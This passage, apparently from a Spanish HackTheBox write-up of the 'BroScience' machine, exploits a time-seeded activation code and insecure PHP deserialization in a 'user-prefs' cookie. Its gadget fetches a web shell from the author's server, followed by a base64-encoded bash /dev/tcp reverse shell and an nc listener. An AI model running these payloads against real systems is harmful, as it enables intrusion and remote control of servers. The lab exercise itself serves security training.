+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
+<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">generate_activation_code</span><span class="mtk1">() {</span>
+<span class="mtk1">    $chars </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW</span><span class="mtk4">XYZ1234567890"</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk7">srand</span><span class="mtk1">(</span><span class="mtk7">time</span><span class="mtk1">());</span>
+<span class="mtk1">    $activation_code </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> ($i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; $i </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">32</span><span class="mtk1">; $i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">        $activation_code </span><span class="mtk5">=</span><span class="mtk1"> $activation_code </span><span class="mtk5">.</span><span class="mtk1"> $chars[</span><span class="mtk7">rand</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk7">strlen</span><span class="mtk1">($chars) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)];</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> $activation_code;</span>
+<span class="mtk1">}</span>
+
+<span class="mtk3">// Source: </span><span class="mtk3 detected-link">https://stackoverflow.com/a/4420773</span><span class="mtk3"> (Slightly adapted)</span>
+<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">rel_time</span><span class="mtk1">($from, $to </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">) {</span>
+<span class="mtk1">    $to </span><span class="mtk5">=</span><span class="mtk1"> (($to </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">) </span><span class="mtk5">?</span><span class="mtk1"> (</span><span class="mtk7">time</span><span class="mtk1">()) </span><span class="mtk5">:</span><span class="mtk1"> ($to));</span>
+<span class="mtk1">    $to </span><span class="mtk5">=</span><span class="mtk1"> ((</span><span class="mtk7">is_int</span><span class="mtk1">($to)) </span><span class="mtk5">?</span><span class="mtk1"> ($to) </span><span class="mtk5">:</span><span class="mtk1"> (</span><span class="mtk7">strtotime</span><span class="mtk1">($to)));</span>
+<span class="mtk1">    $from </span><span class="mtk5">=</span><span class="mtk1"> ((</span><span class="mtk7">is_int</span><span class="mtk1">($from)) </span><span class="mtk5">?</span><span class="mtk1"> ($from) </span><span class="mtk5">:</span><span class="mtk1"> (</span><span class="mtk7">strtotime</span><span class="mtk1">($from)));</span>
+
+<span class="mtk1">    $units </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">array</span>
+<span class="mtk1">    (</span>
+<span class="mtk1">        </span><span class="mtk4">"year"</span><span class="mtk1">   </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk6">29030400</span><span class="mtk1">, </span><span class="mtk3">// seconds in a year   (12 months)</span>
+<span class="mtk1">        </span><span class="mtk4">"month"</span><span class="mtk1">  </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk6">2419200</span><span class="mtk1">,  </span><span class="mtk3">// seconds in a month  (4 weeks)</span>
+<span class="mtk1">        </span><span class="mtk4">"week"</span><span class="mtk1">   </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk6">604800</span><span class="mtk1">,   </span><span class="mtk3">// seconds in a week   (7 days)</span>
+<span class="mtk1">        </span><span class="mtk4">"day"</span><span class="mtk1">    </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk6">86400</span><span class="mtk1">,    </span><span class="mtk3">// seconds in a day    (24 hours)</span>
+<span class="mtk1">        </span><span class="mtk4">"hour"</span><span class="mtk1">   </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk6">3600</span><span class="mtk1">,     </span><span class="mtk3">// seconds in an hour  (60 minutes)</span>
+<span class="mtk1">        </span><span class="mtk4">"minute"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk6">60</span><span class="mtk1">,       </span><span class="mtk3">// seconds in a minute (60 seconds)</span>
+<span class="mtk1">        </span><span class="mtk4">"second"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">         </span><span class="mtk3">// 1 second</span>
+<span class="mtk1">    );</span>
+
+<span class="mtk1">    $diff </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">abs</span><span class="mtk1">($from </span><span class="mtk5">-</span><span class="mtk1"> $to);</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ($diff </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"Just now"</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    $suffix </span><span class="mtk5">=</span><span class="mtk1"> (($from </span><span class="mtk5">&gt;</span><span class="mtk1"> $to) </span><span class="mtk5">?</span><span class="mtk1"> (</span><span class="mtk4">"from now"</span><span class="mtk1">) </span><span class="mtk5">:</span><span class="mtk1"> (</span><span class="mtk4">"ago"</span><span class="mtk1">));</span>
+
+<span class="mtk1">    $unitCount </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">    $output </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1">;</span>
+
+<span class="mtk1">    </span><span class="mtk5">foreach</span><span class="mtk1">($units </span><span class="mtk5">as</span><span class="mtk1"> $unit </span><span class="mtk5">=&gt;</span><span class="mtk1"> $mult)</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">($diff </span><span class="mtk5">&gt;=</span><span class="mtk1"> $mult </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> $unitCount </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">            $unitCount </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">            </span><span class="mtk3">// $and = (($mult != 1) ? ("") : ("and "));</span>
+<span class="mtk1">            $and </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1">;</span>
+<span class="mtk1">            $output </span><span class="mtk5">.=</span><span class="mtk1"> </span><span class="mtk4">", "</span><span class="mtk5">.</span><span class="mtk1">$and</span><span class="mtk5">.</span><span class="mtk7">intval</span><span class="mtk1">($diff </span><span class="mtk5">/</span><span class="mtk1"> $mult)</span><span class="mtk5">.</span><span class="mtk4">" "</span><span class="mtk5">.</span><span class="mtk1">$unit</span><span class="mtk5">.</span><span class="mtk1">((</span><span class="mtk7">intval</span><span class="mtk1">($diff </span><span class="mtk5">/</span><span class="mtk1"> $mult) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">?</span><span class="mtk1"> (</span><span class="mtk4">""</span><span class="mtk1">) </span><span class="mtk5">:</span><span class="mtk1"> (</span><span class="mtk4">"s"</span><span class="mtk1">));</span>  
+<span class="mtk1">            $diff </span><span class="mtk5">-=</span><span class="mtk1"> </span><span class="mtk7">intval</span><span class="mtk1">($diff </span><span class="mtk5">/</span><span class="mtk1"> $mult) </span><span class="mtk5">*</span><span class="mtk1"> $mult;</span>
+<span class="mtk1">        }</span>
+
+<span class="mtk1">    $output </span><span class="mtk5">.=</span><span class="mtk1"> </span><span class="mtk4">" "</span><span class="mtk5">.</span><span class="mtk1">$suffix;</span>
+<span class="mtk1">    $output </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">substr</span><span class="mtk1">($output, </span><span class="mtk7">strlen</span><span class="mtk1">(</span><span class="mtk4">", "</span><span class="mtk1">));</span>
+
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> $output;</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">UserPrefs</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> $theme;</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk7">__construct</span><span class="mtk1">($theme </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"light"</span><span class="mtk1">) {</span>
+<span class="mtk1">                </span><span class="mtk9">$this</span><span class="mtk5">-&gt;</span><span class="mtk1">theme </span><span class="mtk5">=</span><span class="mtk1"> $theme;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">get_theme</span><span class="mtk1">() {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">isset</span><span class="mtk1">($_SESSION[</span><span class="mtk4">'id'</span><span class="mtk1">])) {</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk7">isset</span><span class="mtk1">($_COOKIE[</span><span class="mtk4">'user-prefs'</span><span class="mtk1">])) {</span>
+<span class="mtk1">            $up_cookie </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">base64_encode</span><span class="mtk1">(</span><span class="mtk7">serialize</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">UserPrefs</span><span class="mtk1">()));</span>
+<span class="mtk1">            </span><span class="mtk7">setcookie</span><span class="mtk1">(</span><span class="mtk4">'user-prefs'</span><span class="mtk1">, $up_cookie);</span>
+<span class="mtk1">        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">            $up_cookie </span><span class="mtk5">=</span><span class="mtk1"> $_COOKIE[</span><span class="mtk4">'user-prefs'</span><span class="mtk1">];</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">        $up </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">unserialize</span><span class="mtk1">(</span><span class="mtk7">base64_decode</span><span class="mtk1">($up_cookie));</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> $up</span><span class="mtk5">-&gt;</span><span class="mtk1">theme;</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"light"</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">get_theme_class</span><span class="mtk1">($theme </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk7">isset</span><span class="mtk1">($theme)) {</span>
+<span class="mtk1">        $theme </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_theme</span><span class="mtk1">();</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">strcmp</span><span class="mtk1">($theme, </span><span class="mtk4">"light"</span><span class="mtk1">)) {</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"uk-light"</span><span class="mtk1">;</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"uk-dark"</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">set_theme</span><span class="mtk1">($val) {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">isset</span><span class="mtk1">($_SESSION[</span><span class="mtk4">'id'</span><span class="mtk1">])) {</span>
+<span class="mtk1">        </span><span class="mtk7">setcookie</span><span class="mtk1">(</span><span class="mtk4">'user-prefs'</span><span class="mtk1">,</span><span class="mtk7">base64_encode</span><span class="mtk1">(</span><span class="mtk7">serialize</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">UserPrefs</span><span class="mtk1">($val))));</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Avatar</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> $imgPath;</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk7">__construct</span><span class="mtk1">($imgPath) {</span>
+<span class="mtk1">        </span><span class="mtk9">$this</span><span class="mtk5">-&gt;</span><span class="mtk1">imgPath </span><span class="mtk5">=</span><span class="mtk1"> $imgPath;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">save</span><span class="mtk1">($tmp) {</span>
+<span class="mtk1">        $f </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">fopen</span><span class="mtk1">(</span><span class="mtk9">$this</span><span class="mtk5">-&gt;</span><span class="mtk1">imgPath, </span><span class="mtk4">"w"</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk7">fwrite</span><span class="mtk1">($f, </span><span class="mtk7">file_get_contents</span><span class="mtk1">($tmp));</span>
+<span class="mtk1">        </span><span class="mtk7">fclose</span><span class="mtk1">($f);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">AvatarInterface</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> $tmp;</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> $imgPath;</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk7">__wakeup</span><span class="mtk1">() {</span>
+<span class="mtk1">        $a </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Avatar</span><span class="mtk1">(</span><span class="mtk9">$this</span><span class="mtk5">-&gt;</span><span class="mtk1">imgPath);</span>
+<span class="mtk1">        $a</span><span class="mtk5">-&gt;</span><span class="mtk8">save</span><span class="mtk1">(</span><span class="mtk9">$this</span><span class="mtk5">-&gt;</span><span class="mtk1">tmp);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+<span class="mtk5">?</span><span class="mtk5">&gt;</span>
+</code></pre></div><p>Este <em>script</em> PHP parece ser importante. Por el momento, centrémonos en <code>generate_activation_code</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">generate_activation_code</span><span class="mtk1">() {</span>
+<span class="mtk1">    $chars </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW</span><span class="mtk4">XYZ1234567890"</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk7">srand</span><span class="mtk1">(</span><span class="mtk7">time</span><span class="mtk1">());</span>
+<span class="mtk1">    $activation_code </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> ($i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; $i </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">32</span><span class="mtk1">; $i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">        $activation_code </span><span class="mtk5">=</span><span class="mtk1"> $activation_code </span><span class="mtk5">.</span><span class="mtk1"> $chars[</span><span class="mtk7">rand</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk7">strlen</span><span class="mtk1">($chars) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)];</span>  
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> $activation_code;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>La forma en la que se genera es usando un generador de números pseudo-aleatorios (PRNG) inicializado con una semilla basada en tiempo y usando un <em>hash</em> MD5. Podemos usar la misma función en el REPL de PHP mientras creamos una nueva cuenta y probar algunos de los códigos hasta que uno funcione:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">php</span> -a
+Interactive shell
+
+php &gt; function generate_activation_code() {
+php {     $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+php {     srand(time());
+php {     $activation_code = "";
+php {     for ($i = 0; $i &lt; 32; $i++) {
+php {         $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];  
+php {     }
+php {     return $activation_code;
+php { }
+php &gt;
+php &gt; echo generate_activation_code();
+4pcKTmODxm1XJBzpYBVuZzatVXgNoRuN
+php &gt; echo generate_activation_code();
+hGSR71WVrYAzTo4g6akXhnfQ3OZVehpz
+php &gt; echo generate_activation_code();
+aVOBsUeVFLowCHeDPxOHndEP2qkz2AuU
+</code></pre></div><p>Y así podemos activar nuestra cuenta:</p><p><img src="/images/HTB/BroScience/BroScience-14.png" alt="BroScience 14"></p><p><img src="/images/HTB/BroScience/BroScience-15.png" alt="BroScience 15"></p><p>Si volvemos a iniciar sesión, podemos decidir establecer un tema claro o un tema oscuro:</p><p><img src="/images/HTB/BroScience/BroScience-16.png" alt="BroScience 16"></p><p><img src="/images/HTB/BroScience/BroScience-17.png" alt="BroScience 17"></p><h3 id="ataque-de-deserialización">Ataque de deserialización</h3><p>Y se gestiona usando una <em>cookie</em> llamada <code>user-prefs</code>, que contiene datos codificados en Base64:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NDoiZGFyayI7fQ== | <span class="code-dark-green">base64</span> -d  
+O:9:"UserPrefs":1:{s:5:"theme";s:4:"dark";}
+</code></pre></div><p>Lo anterior es un objeto serializado en PHP, específicamente, un objeto de clase <code>UserPrefs</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">UserPrefs</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> $theme;</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk7">__construct</span><span class="mtk1">($theme </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"light"</span><span class="mtk1">) {</span>  
+<span class="mtk1">                </span><span class="mtk9">$this</span><span class="mtk5">-&gt;</span><span class="mtk1">theme </span><span class="mtk5">=</span><span class="mtk1"> $theme;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Hay una función llamada <code>get_theme</code> que coge la <em>cookie</em> <code>user-prefs</code> y usa <code>unserialize</code>, ocasionando una vulnerabilidad de deserialización insegura:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">get_theme</span><span class="mtk1">() {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">isset</span><span class="mtk1">($_SESSION[</span><span class="mtk4">'id'</span><span class="mtk1">])) {</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk7">isset</span><span class="mtk1">($_COOKIE[</span><span class="mtk4">'user-prefs'</span><span class="mtk1">])) {</span>
+<span class="mtk1">            $up_cookie </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">base64_encode</span><span class="mtk1">(</span><span class="mtk7">serialize</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">UserPrefs</span><span class="mtk1">()));</span>  
+<span class="mtk1">            </span><span class="mtk7">setcookie</span><span class="mtk1">(</span><span class="mtk4">'user-prefs'</span><span class="mtk1">, $up_cookie);</span>
+<span class="mtk1">        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">            $up_cookie </span><span class="mtk5">=</span><span class="mtk1"> $_COOKIE[</span><span class="mtk4">'user-prefs'</span><span class="mtk1">];</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">        $up </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">unserialize</span><span class="mtk1">(</span><span class="mtk7">base64_decode</span><span class="mtk1">($up_cookie));</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> $up</span><span class="mtk5">-&gt;</span><span class="mtk1">theme;</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"light"</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>El código anterior no es seguro porque podemos serializar cualquier objeto y se deserializará sin validación. Por ejemplo, echemos un vistazo a estas clases:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Avatar</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> $imgPath;</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk7">__construct</span><span class="mtk1">($imgPath) {</span>
+<span class="mtk1">        </span><span class="mtk9">$this</span><span class="mtk5">-&gt;</span><span class="mtk1">imgPath </span><span class="mtk5">=</span><span class="mtk1"> $imgPath;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">save</span><span class="mtk1">($tmp) {</span>
+<span class="mtk1">        $f </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">fopen</span><span class="mtk1">(</span><span class="mtk9">$this</span><span class="mtk5">-&gt;</span><span class="mtk1">imgPath, </span><span class="mtk4">"w"</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk7">fwrite</span><span class="mtk1">($f, </span><span class="mtk7">file_get_contents</span><span class="mtk1">($tmp));</span>  
+<span class="mtk1">        </span><span class="mtk7">fclose</span><span class="mtk1">($f);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">AvatarInterface</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> $tmp;</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> $imgPath;</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk7">__wakeup</span><span class="mtk1">() {</span>
+<span class="mtk1">        $a </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Avatar</span><span class="mtk1">(</span><span class="mtk9">$this</span><span class="mtk5">-&gt;</span><span class="mtk1">imgPath);</span>
+<span class="mtk1">        $a</span><span class="mtk5">-&gt;</span><span class="mtk8">save</span><span class="mtk1">(</span><span class="mtk9">$this</span><span class="mtk5">-&gt;</span><span class="mtk1">tmp);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Si creamos una instancia de <code>AvatarInterface</code>, cuando se llama a <code>__wakeup</code> se crea una nueva instancia de <code>Avatar</code> y se ejecuta su método <code>save</code>. Este método nos permite escribir en cualquier archivo (si <code>www-data</code> tiene suficientes permisos). Para hacerlo, en <code>$imgPath</code> debemos poner la ruta al archivo donde queremos escribir, y en <code>$tmp</code> podemos poner una URL donde estará el contenido esperando.</p><p>Si escribimos un <em>script</em> PHP llamado <code>cmd.php</code>, podremos obtener ejecución remota de comandos (RCE):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">cat</span> &gt; payload
+&lt;?php system($_GET['c']); ?&gt;
+^C
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">php &gt; class Avatar {
+php {     public $imgPath;
+php {
+php {     public function __construct($imgPath) {
+php {         $this-&gt;imgPath = $imgPath;
+php {     }
+php {
+php {     public function save($tmp) {
+php {         $f = fopen($this-&gt;imgPath, "w");
+php {         fwrite($f, file_get_contents($tmp));
+php {         fclose($f);
+php {     }
+php { }
+php &gt;
+php &gt; class AvatarInterface {
+php {     public $tmp;
+php {     public $imgPath;
+php {
+php {     public function __wakeup() {
+php {         $a = new Avatar($this-&gt;imgPath);
+php {         $a-&gt;save($this-&gt;tmp);
+php {     }
+php { }
+php &gt;
+php &gt; $ai = new AvatarInterface();
+php &gt; $ai-&gt;tmp = 'http://10.10.17.44/payload';
+php &gt; $ai-&gt;imgPath = '/var/www/html/cmd.php';
+php &gt; echo serialize($ai);
+O:15:"AvatarInterface":2:{s:3:"tmp";s:26:"http://10.10.17.44/payload";s:7:"imgPath";s:21:"/var/www/html/cmd.php";}
+php &gt; echo base64_encode(serialize($ai));
+TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyNjoiaHR0cDovLzEwLjEwLjE3LjQ0L3BheWxvYWQiO3M6NzoiaW1nUGF0aCI7czoyMToiL3Zhci93d3cvaHRtbC9jbWQucGhwIjt9  
+</code></pre></div><p>Ahora, ingresamos el <em>payload</em> codificado en Base64 en la <em>cookie</em> <code>user-prefs</code>:</p><p><img src="/images/HTB/BroScience/BroScience-18.png" alt="BroScience 18"></p><p>Y si todo funciona, el servidor deserializará el <em>payload</em>, creará un objeto <code>AvatarInterface</code> con atributos maliciosos, hará una petición a nuestro servidor HTTP de Python y escribirá el código PHP en <code>/var/www/html/cmd.php</code>. Ahora tenemos un <em>shell</em> en la web:</p><p><img src="/images/HTB/BroScience/BroScience-19.png" alt="BroScience 19"></p><p>Entonces, obtengamos una <em>reverse shell</em> en el sistema:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i &gt;& /dev/tcp/10.10.17.44/4444 0&gt;&1'</span> | <span class="code-dark-green">base64</span>
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k <span class="code-dark-yellow">'https://broscience.htb/cmd.php?c=echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx+|+base64+-d+|+bash'  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
